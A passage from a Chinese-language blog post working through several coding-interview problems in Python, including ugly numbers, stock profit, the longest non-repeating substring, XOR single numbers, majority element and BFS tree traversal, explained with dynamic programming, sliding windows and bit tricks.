<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nthUglyNumber</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        state = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">        dp = [<span class="number">1</span>] * (n + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[state[<span class="number">0</span>]+<span class="number">1</span>]*<span class="number">2</span>,dp[state[<span class="number">1</span>]+<span class="number">1</span>]*<span class="number">3</span>,dp[state[<span class="number">2</span>]+<span class="number">1</span>]*<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span>(dp[i] == dp[state[<span class="number">0</span>]+<span class="number">1</span>]*<span class="number">2</span>):</span><br><span class="line">                state[<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(dp[i] == dp[state[<span class="number">1</span>]+<span class="number">1</span>]*<span class="number">3</span>):</span><br><span class="line">                state[<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(dp[i] == dp[state[<span class="number">2</span>]+<span class="number">1</span>]*<span class="number">5</span>):</span><br><span class="line">                state[<span class="number">2</span>] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></div></figure>


        <h2 id="股票的最大利润"   >
          <a href="#股票的最大利润" class="heading-link"><i class="fas fa-link"></i></a><a href="#股票的最大利润" class="headerlink" title="股票的最大利润"></a>股票的最大利润</h2>
      <p>和之前的<strong>买卖股票最佳时机</strong>一样</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def maxProfit(self, prices: List[int]) -&gt; int:</span><br><span class="line">        minIdx = 0</span><br><span class="line">        maxBenefit = 0</span><br><span class="line">        for i in range(0,len(prices)):</span><br><span class="line">            if(prices[i] &lt; prices[minIdx]):</span><br><span class="line">                minIdx = i</span><br><span class="line">            maxBenefit = max(maxBenefit,prices[i] - prices[minIdx])</span><br><span class="line">        return maxBenefit</span><br></pre></td></tr></table></div></figure>

<p>不过这次分析一下动态规划，参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/gu-piao-de-zui-da-li-run-lcof/solution/mian-shi-ti-63-gu-piao-de-zui-da-li-run-dong-tai-2/" >面试题63. 股票的最大利润（动态规划，清晰图解） - 股票的最大利润 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>假定<code>dp[i]</code>代表以<code>prices[i]</code>为结尾的子数组的最大利润，则可推导得到动态转换方程</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前i日最大利润=max(前(i−1)日最大利润,第i日价格−前i日最低价格)</span><br><span class="line">dp[i] = max(dp[i-1],prices[i]-min(prices[0:i]))</span><br></pre></td></tr></table></div></figure>

<p>依据动态转换方程求得最终代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(prices) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        minIdx = <span class="number">0</span></span><br><span class="line">        dp = [<span class="number">0</span>] * <span class="built_in">len</span>(prices)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(prices)):</span><br><span class="line">            <span class="keyword">if</span>(prices[i] &lt; prices[minIdx]):</span><br><span class="line">                minIdx = i</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i-<span class="number">1</span>],prices[i] - prices[minIdx])</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="built_in">len</span>(prices)-<span class="number">1</span>]</span><br></pre></td></tr></table></div></figure>




        <h2 id="最长不含重复字符的子字符串"   >
          <a href="#最长不含重复字符的子字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#最长不含重复字符的子字符串" class="headerlink" title="最长不含重复字符的子字符串"></a>最长不含重复字符的子字符串</h2>
      <p>参考之前的<strong>无重复字符的最长子串</strong>，使用<strong>滑动窗口+哈希</strong></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(s) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        i,j=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        tmpS = <span class="string">&quot;&quot;</span></span><br><span class="line">        maxLen = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(j &lt; <span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span>(s[j] <span class="keyword">in</span> tmpS):</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            tmpS = s[i:j]</span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">len</span>(<span class="built_in">set</span>(tmpS)) != <span class="built_in">len</span>(tmpS)):</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                tmpS = s[i:j]</span><br><span class="line">            maxLen = <span class="built_in">max</span>(maxLen,j-i)</span><br></pre></td></tr></table></div></figure>

<p>或者使用<strong>动态规划+哈希</strong></p>
<p>假定<code>dp[i]</code>为以<code>s[0:i]</code>这个子字符串的无重复字符的最长字串长度，当加入一个字符，即对于<code>dp[i+1]</code>而言，如果加入的字符<code>s[i+1]</code>可以和前面<code>s[i-dp[i-1]:i]</code>组成无重复的子字符串，那么<code>dp[i+1] = dp[i] + 1</code>，否则<code>dp[i+1] = dp[i]</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">判断加入字符是否可以和前面dp[i-1]个字符串组成无重复子串,推导得到下面的状态转换方程</span><br><span class="line">dp[i] = dp[i-1]</span><br><span class="line">      = dp[i-1] + 1</span><br></pre></td></tr></table></div></figure>

<p>初始状态：<code>dp[0] = 1</code></p>
<p>依据状态转换方程可得代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(s) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(s) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        dp = [<span class="number">0</span>] * (<span class="built_in">len</span>(s))</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">            tmpS = s[i-dp[i-<span class="number">1</span>]:i+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(<span class="built_in">set</span>(tmpS)) == <span class="built_in">len</span>(tmpS)):</span><br><span class="line">                dp[i] = dp[i-<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[i] = dp[i-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="built_in">len</span>(s)-<span class="number">1</span>]</span><br></pre></td></tr></table></div></figure>


        <h2 id="构建乘积数组"   >
          <a href="#构建乘积数组" class="heading-link"><i class="fas fa-link"></i></a><a href="#构建乘积数组" class="headerlink" title="构建乘积数组"></a>构建乘积数组</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021114545583.png" alt="image-20221021114545583"></p>
<p>利用两次遍历依次累乘</p>
<p>对于<code>B[i]</code>：</p>
<ul>
<li><p>第一次遍历，计算从<code>B[0]~B[i-1]</code>的乘积，结果保存在<code>B[i]</code>中</p>
<p>这时候由于<code>B[i] = B[i-1]*A[i-1]</code>，所以我们可以从B[0]依次累乘，只需要遍历一次即可。</p>
</li>
<li><p>第二次遍历，计算从<code>B[n-1]~B[i+1]</code>的乘积，最后乘上之前保存的<code>B[i]</code>即可</p>
<p>同样这时候由于<code>B[i] = B[i+1]*A[i+1]*B[i]</code>，那么我们也可以从<code>B[n-1]</code>开始依次累乘，遍历一次即可。</p>
</li>
</ul>
<p>依据该规律，两次遍历即可得出结果</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">constructArr</span>(<span class="params">self, a: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        product = <span class="number">1</span></span><br><span class="line">        b = [<span class="number">1</span>] * <span class="built_in">len</span>(a)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">                product = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                product *= a[i-<span class="number">1</span>]</span><br><span class="line">            b[i] = product</span><br><span class="line">        product = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="built_in">len</span>(a) - <span class="number">1</span>):</span><br><span class="line">                product = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                product *= a[i+<span class="number">1</span>]</span><br><span class="line">            b[i] *= product</span><br><span class="line">        <span class="keyword">return</span> b</span><br></pre></td></tr></table></div></figure>




        <h2 id="数组中数字出现的次数"   >
          <a href="#数组中数字出现的次数" class="heading-link"><i class="fas fa-link"></i></a><a href="#数组中数字出现的次数" class="headerlink" title="数组中数字出现的次数"></a>数组中数字出现的次数</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021154510005.png" alt="image-20221021154510005"></p>
<p>如果不考虑空间复杂度，直接使用hash即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def singleNumbers(self, nums: List[int]) -&gt; List[int]:</span><br><span class="line">        dict = &#123;&#125;</span><br><span class="line">        myList = []</span><br><span class="line">        for i in nums:</span><br><span class="line">            if(i in dict.keys()):</span><br><span class="line">                dict[i] = not dict[i]</span><br><span class="line">            else:</span><br><span class="line">                dict[i] = True</span><br><span class="line">        for i in dict.keys():</span><br><span class="line">            if(dict[i] == True):</span><br><span class="line">                myList.append(i)</span><br><span class="line">        return myList</span><br><span class="line">        </span><br></pre></td></tr></table></div></figure>

<p>但是要求空间复杂度为O(1)，那么就需要进行其他方法了，参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/solution/jian-zhi-offer-56-i-shu-zu-zhong-shu-zi-tykom/" >剑指 Offer 56 - I. 数组中数字出现的次数（位运算，清晰图解） - 数组中数字出现的次数 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>提供的思路，位运算</p>
<ul>
<li>假设不同的两位数分别为<code>x,y</code></li>
<li>通过异或<code>nums</code>里所有数，求得<code>x⊕y</code>为<code>xy</code></li>
<li>假定<code>m=1</code>，通过位运算逐次循环左移并且异或<code>x⊕y</code>，求得<code>x⊕y</code>中最小为1的位。</li>
<li>由于<code>x⊕y</code>中某位<code>bit</code>为<code>1</code>，那么由于异或的特性，<code>x、y</code>各自该位的<code>bit</code>一定一个为<code>1</code>一个为<code>0</code>，基于此对<code>nums</code>进行分组</li>
<li>将该位<code>bit</code>为<code>1</code>的分为一组，为<code>0</code>的分为另一组，那么即可将<code>x、y</code>分开。同时对于其他的数字，由于各自独立成对，那么成对的数字一定会被分到同一组，之后异或之后也直接为0了。</li>
<li>然后各自两种进行异或即可得到最终的<code>x、y</code></li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">singleNumbers</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        xy = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            xy ^= i</span><br><span class="line">        m = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> (m &amp; xy == <span class="number">0</span>):</span><br><span class="line">            m &lt;&lt;= <span class="number">1</span></span><br><span class="line">        x,y = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(i &amp; m == <span class="number">0</span>):</span><br><span class="line">                x ^= i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                y ^= i</span><br><span class="line">        <span class="keyword">return</span> [x,y]</span><br></pre></td></tr></table></div></figure>




        <h2 id="礼物的最大价值"   >
          <a href="#礼物的最大价值" class="heading-link"><i class="fas fa-link"></i></a><a href="#礼物的最大价值" class="headerlink" title="礼物的最大价值"></a>礼物的最大价值</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021162958198.png" alt="image-20221021162958198"></p>
<p>动态规划，设<code>dp[i][j]</code>为以<code>[i,j]</code>为终点的途径的获得的最大价值礼物，则有状态转换方程如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i][j] = max(dp[i-1][j],dp[i][j-1]) + grid[i][j]</span><br></pre></td></tr></table></div></figure>

<p>初始状态：<code>dp[0][0] = grid[0][0]</code></p>
<p>同时由于可能会超出边界，所以将<code>dp</code>扩大一个长宽</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp = [[0 for i in range(len(grid[0]) + 1)] for i in range(len(grid) + 1)]</span><br></pre></td></tr></table></div></figure>

<p>同时从<code>dp[1][1]</code>开始作为计数，边界为数值为0，依据状态转换方程可得</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxValue</span>(<span class="params">self, grid: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        dp = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(grid[<span class="number">0</span>]) + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(grid) + <span class="number">1</span>)]</span><br><span class="line">        dp[<span class="number">1</span>][<span class="number">1</span>] = grid[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(grid) + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(grid[<span class="number">0</span>]) + <span class="number">1</span>):</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>]) + grid[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="built_in">len</span>(grid)][<span class="built_in">len</span>(grid[<span class="number">0</span>])]</span><br></pre></td></tr></table></div></figure>




        <h2 id="数组中出现次数超过一半的数字"   >
          <a href="#数组中出现次数超过一半的数字" class="heading-link"><i class="fas fa-link"></i></a><a href="#数组中出现次数超过一半的数字" class="headerlink" title="数组中出现次数超过一半的数字"></a>数组中出现次数超过一半的数字</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021170623491.png" alt="image-20221021170623491"></p>
<p>第一个想法就是<code>hash</code>表</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">majorityElement</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(nums) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(i <span class="keyword">in</span> <span class="built_in">dict</span>.keys()):</span><br><span class="line">                <span class="built_in">dict</span>[i] = <span class="built_in">dict</span>[i] + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">dict</span>[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">dict</span>[i] &gt; <span class="built_in">len</span>(nums)//<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">return</span> i</span><br></pre></td></tr></table></div></figure>

<p>第二个想法就是排序，然后取中位数即为超过数组一半的数</p>
<p>第三个参考摩尔投票法：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/shu-zu-zhong-chu-xian-ci-shu-chao-guo-yi-ban-de-shu-zi-lcof/solution/mian-shi-ti-39-shu-zu-zhong-chu-xian-ci-shu-chao-3/" >剑指 Offer 39. 数组中出现次数超过一半的数字（摩尔投票法，清晰图解） - 数组中出现次数超过一半的数字 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">majorityElement</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">sum</span> == <span class="number">0</span>):</span><br><span class="line">                x = i</span><br><span class="line">            <span class="keyword">if</span>(i != x):</span><br><span class="line">                <span class="built_in">sum</span> -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">sum</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></div></figure>


        <h2 id="和为s的连续正数序列"   >
          <a href="#和为s的连续正数序列" class="heading-link"><i class="fas fa-link"></i></a><a href="#和为s的连续正数序列" class="headerlink" title="和为s的连续正数序列"></a>和为s的连续正数序列</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021211704786.png" alt="image-20221021211704786"></p>
<p>和求最长不重复子串一样，直接滑动窗口</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findContinuousSequence</span>(<span class="params">self, target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span></span><br><span class="line">        i,j = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        myList = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,ceil(target/<span class="number">2</span>)+<span class="number">1</span>)]</span><br><span class="line">        res = []</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="built_in">sum</span> += myList[i]</span><br><span class="line">        <span class="keyword">while</span>(j &lt; <span class="built_in">len</span>(myList)):</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">sum</span> &lt; target):</span><br><span class="line">                <span class="keyword">if</span>(j == <span class="built_in">len</span>(myList)-<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                    <span class="built_in">sum</span> += myList[j]</span><br><span class="line">            <span class="keyword">elif</span>(<span class="built_in">sum</span> == target):</span><br><span class="line">                res.append(myList[i:j+<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span>(j == <span class="built_in">len</span>(myList)-<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                    <span class="built_in">sum</span> += myList[j]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">sum</span> -= myList[i]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>




        <h2 id="从上到下打印二叉树"   >
          <a href="#从上到下打印二叉树" class="heading-link"><i class="fas fa-link"></i></a><a href="#从上到下打印二叉树" class="headerlink" title="从上到下打印二叉树"></a>从上到下打印二叉树</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221024113552404.png" alt="image-20221024113552404"></p>
<p>可知BFS广度优先搜索满足要求，使用队列</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span>(<span class="params">self, root: TreeNode</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        res = []</span><br><span class="line">        q = queue.Queue()</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">bfs</span>():</span></span><br><span class="line">            <span class="keyword">if</span>(q.qsize() == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            root = q.get()</span><br><span class="line">            <span class="keyword">if</span> (root == <span class="literal">None</span>):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            res.append(root.val)</span><br><span class="line">            <span class="keyword">if</span>(root.left != <span class="literal">None</span>):</span><br><span class="line">                q.put(root.left)</span><br><span class="line">            <span class="keyword">if</span>(root.right != <span class="literal">None</span>):</span><br><span class="line">                q.put(root.right)</span><br><span class="line">            bfs()</span><br><span class="line">        q.put(root)</span><br><span class="line">        bfs()</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>

<p>去掉这个递归有点麻烦，多次判断，尝试去掉递归</p>
